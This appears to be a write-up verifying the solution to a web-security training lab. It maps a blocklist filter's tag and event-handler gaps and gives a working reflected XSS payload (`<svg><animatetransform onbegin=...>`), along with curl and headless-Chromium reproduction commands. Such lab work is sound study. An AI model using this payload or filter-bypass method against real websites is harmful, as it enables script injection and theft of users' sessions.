# Verification — SVG animateTransform/onbegin filter gap

## Methodology
1. Reflection mapping (curl): unique marker → single echo (`<h1>`, verbatim?).
2. Behavior probe with classic vectors (`<img onerror>`, `<script>`, `<svg>`) to
   classify the filter (reject-400 vs strip vs encode).
3. Tag sweep (~25 SVG + HTML tags, explicit GET query building).
4. Attribute/keyword sweep (`onbegin` vs `onload`, animation attrs, `javascript:`).
5. Combined-payload reflection check, then headless execution proof (title marker).
6. Alternative analysis (`<image onerror>`, other handlers on allowed hosts).
7. Lab acceptance: real-browser `alert(1)`; banner polls.

## Evidence

### 1. Reflection (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>
```

### 2. Filter behavior (curl status codes)
```
<svg>                              → 200 + verbatim
<img src=x onerror=A>              → 400
<script>alert(1)</script>          → 400
<svg><animate onbegin=B>           → 400
<svg><a><animate attributeName=href values=javascript:alert(1)>… → 400
```

### 3. Tag map (curl, 200 = pass)
PASS: svg, text, animateTransform, title, image, circle, rect, ellipse, line
BLOCK (400): a, animate, animateMotion, set, desc, g, use, image-as-alias (see below),
  foreignObject, switch, tspan, textPath, path, polygon, polyline
Note: `<image>` passes as a TAG probe but the `<image src=x onerror>` COMBINATION
400s — the `onerror` (not the tag) triggers there (see §6).

### 4. Attribute/keyword map (inside `<svg …>`, 200 = pass)
PASS: attributeName, values, href, xlink:href, javascript:, **onbegin**, from, to,
  dur, repeatCount, x, y, width, height
BLOCK (400): onload (and per §6: onerror, onfocus, onmouseover)

### 5. Combined reflection + execution proof
```
?search=<svg><animatetransform onbegin=document.title='SVGWIN'>
→ 200 + h1 shows the payload VERBATIM
→ headless dump-dom: <title>SVGWIN</title>   (SMIL begin fired on load)
```

### 6. Alternative analysis (all dead, each for a recorded reason)
| Candidate | Result | Why |
|---|---|---|
| `<image src=x onerror=…>` | 400 | `onerror` listed (tag was never the problem) |
| `<svg onerror>/<circle onload>/<rect onmouseover>/…` | 400 | common handlers listed regardless of allowed host |
| `<animate>`/`<animateMotion>`/`<set>`-based | 400 | obvious SVG vectors explicitly listed |
| `<a href=javascript:…>` | 400 | `<a>` listed |
| Case/separator evasions | not re-run here | prior-lab proof stands (case-insensitive, separator-tolerant); gap-hunting dominates evasion-hunting against this filter generation |

### 7. Lab acceptance
Real browser → `/?search=%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E`
→ `alert(1)` on load → `is-solved` (first poll).

## Reproducibility
```
BASE=…; q() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote_plus(sys.argv[1]))" "$1"; }
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/?search=$(q '<animateTransform>')"  # expect 200
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/?search=$(q '<svg onbegin=X>')"      # expect 200
curl -s -o /dev/null -w '%{http_code}\n' "$BASE/?search=$(q '<svg onload=X>')"       # expect 400
chromium --headless --no-sandbox --dump-dom "$BASE/?search=$(q "<svg><animatetransform onbegin=document.title='M'>")" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: verbatim echo, tag map (25 tags), attribute map (16 keywords),
  combined reflection, SMIL-begin execution (title), real-browser acceptance.
- The gap pair is minimal and forced: the only passing executable combination found
  after mapping both dimensions.